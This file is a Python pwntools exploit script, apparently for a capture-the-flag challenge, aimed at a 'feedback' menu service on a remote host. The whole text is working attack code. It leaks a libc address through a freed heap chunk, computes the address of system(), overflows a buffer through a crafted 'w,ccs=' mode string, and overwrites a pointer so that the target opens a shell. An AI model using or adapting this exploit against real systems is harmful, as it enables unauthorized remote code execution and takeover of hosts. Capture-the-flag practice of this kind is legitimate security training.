from pwn import *

def handle_feedback(name, mode, msg=""):
	r.sendline("1")
	print r.recv()

	r.sendline(name)
	print r.recv()

	r.send(mode)
	print r.recv()

	if mode[0] == "w":
		r.send(msg)

	print r.recvuntil(recvuntil)

def delete_feedback(idx):
	r.sendline("3")
	print r.recv()

	r.sendline(str(idx))
	print r.recvuntil(recvuntil)

def modify_feedback(idx, msg):
	r.sendline("4")
	print r.recv()

	r.sendline(str(idx))
	print r.recv()

	r.send(msg)
	print r.recvuntil(recvuntil)

def show_feedback(idx):
	r.sendline("2")
	print r.recv()

	r.sendline(str(idx))
	data = r.recvuntil(recvuntil)
	print data
	return data

r = remote("feedback.tendollar.kr", 12000)
recvuntil = ">> "

handle_feedback("A"*8, "w", "a"*8)
handle_feedback("B"*8, "w", "b"*8)
handle_feedback("C"*8, "w", "c"*8)
handle_feedback("D"*8, "w", "d"*8)

delete_feedback(2)
delete_feedback(1)
delete_feedback(0)
handle_feedback("E"*8, "w", "e"*8)

recv = show_feedback(4)
libc_base = u64(recv.split("e"*8)[1].split("\n")[0].ljust(8, "\x00")) - 0x3c4b78
system = libc_base + 0x45390
print "libc base : ", hex(libc_base)

payload = "w,ccs="
payload += "z"*(0x108)

handle_feedback("F"*8, payload, "f"*8)
modify_feedback(1, "/bin/sh\x00" + "Z"*(0x100-8) + p64(system))

r.sendline("2")
print r.recv()
r.sendline("1")
r.interactive()


